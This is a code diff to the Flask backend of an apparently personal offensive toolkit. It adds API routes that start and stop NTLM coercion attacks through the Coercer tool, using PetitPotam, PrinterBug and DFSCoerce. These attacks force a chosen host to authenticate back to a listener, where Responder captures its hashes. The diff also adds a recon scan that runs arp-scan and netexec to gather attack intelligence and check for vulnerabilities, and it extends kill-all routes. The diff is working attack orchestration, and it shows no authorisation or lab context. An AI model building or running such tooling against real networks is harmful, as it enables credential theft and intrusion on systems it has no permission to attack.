@@ -372,6 +372,14 @@ default_cred_lock = threading.Lock()
 cred_spray_state = {'running': False, 'process': None, 'start_time': None, 'results_count': 0, 'user': '', 'domain': ''}
 cred_spray_lock = threading.Lock()
 
+# Global state for NTLM coercion (Coercer tool)
+coerce_state = {'running': False, 'process': None, 'start_time': None, 'method': '', 'target': ''}
+coerce_lock = threading.Lock()
+
+# Global state for recon scan (arp-scan + nxc)
+recon_state = {'running': False, 'process': None, 'start_time': None, 'subnet': '', 'interface': '', 'phase': ''}
+recon_lock = threading.Lock()
+
 # Global state for live wardrive scanning
 import sys
 sys.path.insert(0, '/home/ov3rr1d3/wifi_arsenal/wardrive_system/wardrive')
@@ -4627,34 +4635,73 @@ def kill_all():
     
     killed = []
     
-    # Kill all WiFi attack/scan processes
+    # Kill all WiFi attack/scan processes (ALL pages)
     processes_to_kill = [
         'airodump-ng',
-        'aireplay-ng', 
+        'aireplay-ng',
         'hcxdumptool',
         'reaver',
         'bully',
         'hostapd',
         'dnsmasq',
         'wifite',
-        'wash'
+        'wash',
+        'nmap',
+        'responder',
+        'coercer',
+        'arp-scan',
     ]
-    
+
     for proc in processes_to_kill:
         result = subprocess.run(['pkill', '-9', proc], capture_output=True)
         if result.returncode == 0:
             killed.append(proc)
-    
-    # Reset tracking state
+
+    # Kill discovery script (python3 discover.py)
+    result = subprocess.run(['pkill', '-9', '-f', 'discover.py'], capture_output=True)
+    if result.returncode == 0:
+        killed.append('discover.py')
+
+    # Kill nxc (netexec) — uses -f because process name varies
+    result = subprocess.run(['pkill', '-9', '-f', 'nxc'], capture_output=True)
+    if result.returncode == 0:
+        killed.append('nxc')
+
+    # Reset tracking state — Page 1
     live_attack['running'] = False
     live_attack['pid'] = None
     orchestrator_state['running'] = False
-    
+
+    # Reset tracking state — Internal page
+    with nmap_scan_lock:
+        nmap_scan_state['running'] = False
+        nmap_scan_state['process'] = None
+        nmap_scan_state['start_time'] = None
+    with discovery_state_lock:
+        discovery_state['start_time'] = None
+    with responder_state_lock:
+        responder_state['start_time'] = None
+        responder_state['log_position'] = 0
+        responder_state['hash_file_positions'] = {}
+    with coerce_lock:
+        coerce_state['running'] = False
+        coerce_state['process'] = None
+        coerce_state['start_time'] = None
+        coerce_state['method'] = ''
+        coerce_state['target'] = ''
+    with recon_lock:
+        recon_state['running'] = False
+        recon_state['process'] = None
+        recon_state['start_time'] = None
+        recon_state['phase'] = ''
+        recon_state['subnet'] = ''
+        recon_state['interface'] = ''
+
     if killed:
         output = f"Killed: {', '.join(killed)}"
     else:
         output = "No active processes found"
-    
+
     return jsonify({'success': True, 'output': output})
 
 
@@ -4680,17 +4727,52 @@ def stop_current():
         orchestrator_state['running'] = False
         killed.append('orchestrator')
     
-    # Kill common attack processes that might be running
-    for proc in ['airodump-ng', 'aireplay-ng', 'hcxdumptool', 'reaver', 'bully']:
+    # Kill common attack processes that might be running (ALL pages)
+    for proc in ['airodump-ng', 'aireplay-ng', 'hcxdumptool', 'reaver', 'bully', 'nmap', 'responder', 'coercer', 'arp-scan']:
         result = subprocess.run(['pkill', '-9', proc], capture_output=True)
         if result.returncode == 0:
             killed.append(proc)
-    
+
+    # Kill discovery script
+    result = subprocess.run(['pkill', '-9', '-f', 'discover.py'], capture_output=True)
+    if result.returncode == 0:
+        killed.append('discover.py')
+
+    # Kill nxc (netexec)
+    result = subprocess.run(['pkill', '-9', '-f', 'nxc'], capture_output=True)
+    if result.returncode == 0:
+        killed.append('nxc')
+
+    # Reset Internal page state
+    with nmap_scan_lock:
+        nmap_scan_state['running'] = False
+        nmap_scan_state['process'] = None
+        nmap_scan_state['start_time'] = None
+    with discovery_state_lock:
+        discovery_state['start_time'] = None
+    with responder_state_lock:
+        responder_state['start_time'] = None
+        responder_state['log_position'] = 0
+        responder_state['hash_file_positions'] = {}
+    with coerce_lock:
+        coerce_state['running'] = False
+        coerce_state['process'] = None
+        coerce_state['start_time'] = None
+        coerce_state['method'] = ''
+        coerce_state['target'] = ''
+    with recon_lock:
+        recon_state['running'] = False
+        recon_state['process'] = None
+        recon_state['start_time'] = None
+        recon_state['phase'] = ''
+        recon_state['subnet'] = ''
+        recon_state['interface'] = ''
+
     if killed:
         output = f"Stopped: {', '.join(killed)}"
     else:
         output = "Nothing was running"
-    
+
     return jsonify({'success': True, 'output': output})
 
 
@@ -6584,48 +6666,19 @@ def internal_scan():
 
     def run_nmap():
         global nmap_scan_state
-        results_file = os.path.join(CAPTURE_DIR, 'nmap_results.json')
-        accumulated_hosts = {}  # keyed by IP for merging across passes
         try:
-            while True:
-                with nmap_scan_lock:
-                    if not nmap_scan_state['running']:
-                        break
-                cmd = ['bash', script, subnet]
-                if interface:
-                    cmd.append(interface)
-                process = subprocess.Popen(
-                    cmd,
-                    stdout=subprocess.PIPE,
-                    stderr=subprocess.STDOUT,
-                    text=True
-                )
-                with nmap_scan_lock:
-                    nmap_scan_state['process'] = process
-                process.wait()
-                with nmap_scan_lock:
-                    if not nmap_scan_state['running']:
-                        break
-                # Merge this pass into accumulated results
-                try:
-                    with open(results_file, 'r') as f:
-                        pass_data = json.load(f)
-                    for host in pass_data.get('hosts', []):
-                        ip = host.get('ip', '')
-                        if ip:
-                            accumulated_hosts[ip] = host  # latest data wins
-                    # Write merged results back
-                    merged = {
-                        'hosts': list(accumulated_hosts.values()),
-                        'scan_time': pass_data.get('scan_time', ''),
-                        'targets_scanned': subnet
-                    }
-                    with open(results_file, 'w') as f:
-                        json.dump(merged, f, indent=2)
-                except (json.JSONDecodeError, FileNotFoundError):
-                    pass
-                # Brief pause before next pass
-                time.sleep(5)
+            cmd = ['bash', script, subnet]
+            if interface:
+                cmd.append(interface)
+            process = subprocess.Popen(
+                cmd,
+                stdout=subprocess.PIPE,
+                stderr=subprocess.STDOUT,
+                text=True
+            )
+            with nmap_scan_lock:
+                nmap_scan_state['process'] = process
+            process.wait()
         finally:
             with nmap_scan_lock:
                 nmap_scan_state['running'] = False
@@ -6870,6 +6923,325 @@ def internal_intel():
         'discovery_running': os.path.exists('/tmp/discovery_running'),
         'responder_running': os.path.exists('/tmp/responder_pid.txt')
     })
+
+
+@app.route('/api/internal/coerce/start', methods=['POST'])
+def internal_coerce_start():
+    """Start NTLM coercion attack against a target host.
+    Forces the target to authenticate back to Kali (where Responder catches the hash).
+    Uses Coercer tool which tries PetitPotam, PrinterBug, DFSCoerce, etc."""
+    global coerce_state
+
+    with coerce_lock:
+        if coerce_state['running']:
+            return jsonify({'success': False, 'error': 'Coercion already running'}), 400
+
+    data = request.json or {}
+    target = data.get('target', '')
+    interface = data.get('interface', 'alfa1')
+    username = data.get('username', '')
+    password = data.get('password', '')
+    domain = data.get('domain', '')
+
+    if not target or not re.match(r'^[0-9.]+$', target):
+        return jsonify({'success': False, 'error': 'Invalid target IP'}), 400
+
+    VALID_INTERFACES = {'alfa0', 'alfa1', 'eth0', 'wlan0', 'wlan1'}
+    if interface not in VALID_INTERFACES:
+        return jsonify({'success': False, 'error': f'Invalid interface: {interface}'}), 400
+
+    # Check Responder is running — coercion is useless without it
+    responder_running = False
+    with responder_state_lock:
+        if responder_state['start_time'] is not None:
+            # Verify the process is actually alive via PID file
+            pid_file = '/tmp/responder_pid.txt'
+            if os.path.exists(pid_file):
+                try:
+                    with open(pid_file, 'r') as f:
+                        pid = int(f.read().strip())
+                    os.kill(pid, 0)
+                    responder_running = True
+                except (ProcessLookupError, ValueError, PermissionError, OSError):
+                    pass
+    if not responder_running:
+        return jsonify({'success': False, 'error': 'Start Responder first — coercion forces auth into Responder'}), 400
+
+    # Get Kali's IP on the interface (listener IP for coercer)
+    listener_ip = None
+    try:
+        addrs = psutil.net_if_addrs().get(interface, [])
+        for addr in addrs:
+            if addr.family == 2:  # AF_INET
+                listener_ip = addr.address
+                break
+    except Exception:
+        pass
+    if not listener_ip:
+        return jsonify({'success': False, 'error': f'No IP on {interface} — is it connected?'}), 400
+
+    def run_coerce():
+        global coerce_state
+        try:
+            cmd = ['coercer', 'coerce', '-t', target, '-l', listener_ip, '--always-continue']
+            if username and password:
+                cmd.extend(['-u', username, '-p', password])
+                if domain:
+                    cmd.extend(['-d', domain])
+            else:
+                cmd.append('--no-pass')
+
+            with coerce_lock:
+                coerce_state['method'] = 'Starting...'
+
+            process = subprocess.Popen(
+                cmd,
+                stdout=subprocess.PIPE,
+                stderr=subprocess.STDOUT,
+                text=True
+            )
+            with coerce_lock:
+                coerce_state['process'] = process
+
+            # Stream output to capture method names
+            output_lines = []
+            for line in process.stdout:
+                line = line.strip()
+                if line:
+                    output_lines.append(line)
+                    # Coercer prints method names as it tries them
+                    if 'MS-' in line or 'EFSRPC' in line or 'RPRN' in line or 'DFSNM' in line:
+                        with coerce_lock:
+                            coerce_state['method'] = line[:80]
+                    elif 'Listening' in line or 'auth' in line.lower():
+                        with coerce_lock:
+                            coerce_state['method'] = line[:80]
+
+            process.wait()
+
+            # Save output for review
+            output_file = os.path.join(CAPTURE_DIR, 'coerce_output.txt')
+            with open(output_file, 'w') as f:
+                f.write('\n'.join(output_lines))
+
+        finally:
+            with coerce_lock:
+                coerce_state['running'] = False
+                coerce_state['process'] = None
+                coerce_state['method'] = 'Done'
+
+    with coerce_lock:
+        coerce_state['running'] = True
+        coerce_state['start_time'] = time.time()
+        coerce_state['target'] = target
+        coerce_state['method'] = 'Starting...'
+
+    thread = threading.Thread(target=run_coerce)
+    thread.daemon = True
+    thread.start()
+
+    return jsonify({'success': True, 'message': f'Coercing {target} → {listener_ip}'})
+
+
+@app.route('/api/internal/coerce/stop', methods=['POST'])
+def internal_coerce_stop():
+    """Stop running coercion attack"""
+    global coerce_state
+    with coerce_lock:
+        proc = coerce_state['process']
+    if proc:
+        try:
+            proc.terminate()
+            proc.wait(timeout=5)
+        except Exception:
+            proc.kill()
+        with coerce_lock:
+            coerce_state['running'] = False
+            coerce_state['process'] = None
+            coerce_state['start_time'] = None
+            coerce_state['method'] = ''
+            coerce_state['target'] = ''
+        return jsonify({'success': True, 'message': 'Coercion stopped'})
+    return jsonify({'success': False, 'error': 'No coercion running'})
+
+
+@app.route('/api/internal/coerce/status', methods=['GET'])
+def internal_coerce_status():
+    """Get coercion attack status"""
+    with coerce_lock:
+        running = coerce_state['running']
+        start_time = coerce_state['start_time']
+        method = coerce_state['method']
+        target = coerce_state['target']
+    return jsonify({
+        'running': running,
+        'start_time': start_time,
+        'method': method,
+        'target': target
+    })
+
+
+# ========== RECON SCAN (arp-scan + nxc) ==========
+
+@app.route('/api/internal/recon/start', methods=['POST'])
+def internal_recon_start():
+    """Start recon scan: arp-scan for host discovery + nxc for attack intel"""
+    global recon_state
+    data = request.json or {}
+    subnet = data.get('subnet', '')
+    interface = data.get('interface', 'alfa1')
+
+    if not subnet or not re.match(r'^[0-9./]+$', subnet):
+        return jsonify({'success': False, 'error': 'Invalid subnet format'}), 400
+
+    VALID_INTERFACES = {'alfa0', 'alfa1', 'eth0', 'wlan0', 'wlan1'}
+    if interface not in VALID_INTERFACES:
+        return jsonify({'success': False, 'error': f'Invalid interface: {interface}'}), 400
+
+    with recon_lock:
+        if recon_state['running']:
+            return jsonify({'success': False, 'error': 'Recon scan already running'}), 409
+
+    # Clear stale results (session-scoped data)
+    results_file = os.path.join(CAPTURE_DIR, 'recon_results.json')
+    if os.path.exists(results_file):
+        try:
+            os.remove(results_file)
+        except OSError:
+            pass
+
+    def run_recon():
+        global recon_state
+        try:
+            script = os.path.join(SCRIPT_DIR, 'internal', 'recon_scan.sh')
+            cmd = ['bash', script, subnet, interface]
+            process = subprocess.Popen(
+                cmd,
+                stdout=subprocess.PIPE,
+                stderr=subprocess.STDOUT,
+                text=True
+            )
+            with recon_lock:
+                recon_state['process'] = process
+
+            for line in process.stdout:
+                line = line.strip()
+                if not line:
+                    continue
+                if 'Phase 1' in line:
+                    with recon_lock:
+                        recon_state['phase'] = 'arp-scan'
+                elif 'Phase 2' in line:
+                    with recon_lock:
+                        recon_state['phase'] = 'nxc-smb'
+                elif 'Phase 3' in line:
+                    with recon_lock:
+                        recon_state['phase'] = 'nxc-vulns'
+                elif 'complete' in line.lower():
+                    with recon_lock:
+                        recon_state['phase'] = 'done'
+
+            process.wait()
+        finally:
+            with recon_lock:
+                recon_state['running'] = False
+                recon_state['process'] = None
+                recon_state['phase'] = 'done'
+
+    with recon_lock:
+        recon_state['running'] = True
+        recon_state['start_time'] = time.time()
+        recon_state['subnet'] = subnet
+        recon_state['interface'] = interface
+        recon_state['phase'] = 'starting'
+
+    thread = threading.Thread(target=run_recon)
+    thread.daemon = True
+    thread.start()
+
+    return jsonify({'success': True, 'message': f'Recon scan started on {subnet} via {interface}'})
+
+
+@app.route('/api/internal/recon/stop', methods=['POST'])
+def internal_recon_stop():
+    """Stop running recon scan"""
+    global recon_state
+    with recon_lock:
+        proc = recon_state['process']
+    if proc:
+        try:
+            proc.terminate()
+            proc.wait(timeout=5)
+        except Exception:
+            proc.kill()
+        # Kill child processes (arp-scan, nxc)
+        subprocess.run(['pkill', '-9', 'arp-scan'], capture_output=True)
+        subprocess.run(['pkill', '-9', '-f', 'nxc'], capture_output=True)
+        with recon_lock:
+            recon_state['running'] = False
+            recon_state['process'] = None
+            recon_state['start_time'] = None
+            recon_state['phase'] = ''
+            recon_state['subnet'] = ''
+            recon_state['interface'] = ''
+        return jsonify({'success': True, 'message': 'Recon scan stopped'})
+    return jsonify({'success': False, 'error': 'No recon scan running'})
+
+
+@app.route('/api/internal/recon/status', methods=['GET'])
+def internal_recon_status():
+    """Get recon scan status"""
+    with recon_lock:
+        running = recon_state['running']
+        start_time = recon_state['start_time']
+        phase = recon_state['phase']
+        subnet = recon_state['subnet']
+    elapsed = 0
+    if running and start_time:
+        elapsed = int(time.time() - start_time)
+    return jsonify({
+        'running': running,
+        'phase': phase,
+        'start_time': start_time,
+        'subnet': subnet,
+        'elapsed': elapsed
+    })
+
+
+@app.route('/api/internal/recon/results', methods=['GET'])
+def internal_recon_results():
+    """Get recon scan results, enriched with device classification"""
+    results_file = os.path.join(CAPTURE_DIR, 'recon_results.json')
+    # Fall back to nmap_results.json for backwards compat
+    if not os.path.exists(results_file):
+        results_file = os.path.join(CAPTURE_DIR, 'nmap_results.json')
+    if os.path.exists(results_file):
+        with open(results_file, 'r') as f:
+            results = json.load(f)
+        for host in results.get('hosts', []):
+            device_type, vendor = classify_device(host)
+            host['device_type'] = device_type
+            host['vendor'] = vendor
+        return jsonify({'success': True, 'results': results})
+    return jsonify({'success': False, 'error': 'No results available'})
+
+
+@app.route('/api/internal/recon/clear', methods=['POST'])
+def internal_recon_clear():
+    """Clear recon scan results"""
+    global recon_state
+    with recon_lock:
+        if recon_state['running']:
+            return jsonify({'success': False, 'error': 'Recon scan is still running'}), 409
+    results_file = os.path.join(CAPTURE_DIR, 'recon_results.json')
+    if os.path.exists(results_file):
+        try:
+            os.remove(results_file)
+        except OSError:
+            pass
+    with recon_lock:
+        recon_state = {'running': False, 'process': None, 'start_time': None, 'subnet': '', 'interface': '', 'phase': ''}
+    return jsonify({'success': True})
 
 
 @app.route('/api/internal/responder/start', methods=['POST'])
